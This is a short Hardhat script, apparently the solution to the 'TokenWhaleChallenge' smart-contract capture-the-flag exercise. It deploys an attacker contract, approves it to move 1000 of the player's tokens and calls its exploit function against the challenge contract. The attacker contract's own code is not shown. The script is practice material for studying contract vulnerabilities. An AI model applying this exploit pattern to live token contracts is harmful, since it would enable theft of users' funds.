import { ethers } from "hardhat";

const solve = async () => {
  const challengeAddress = "0xe4E04E6b95ef9683EAf5eA1Bc24fa3861e549c90";
  const [player] = await ethers.getSigners();

  const challengeContract = await ethers.getContractAt(
    "TokenWhaleChallenge",
    challengeAddress
  );

  const TokenWhaleAttacker = await ethers.getContractFactory(
    "TokenWhaleAttacker",
    player
  );

  const attackerContract = await TokenWhaleAttacker.deploy();
  await attackerContract.deployed();

  let tx = await challengeContract
    .connect(player)
    .approve(attackerContract.address, 1000);

  console.log(await tx.wait());

  tx = await attackerContract.exploit(challengeContract.address, 10);
  console.log(await tx.wait());
};

solve().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
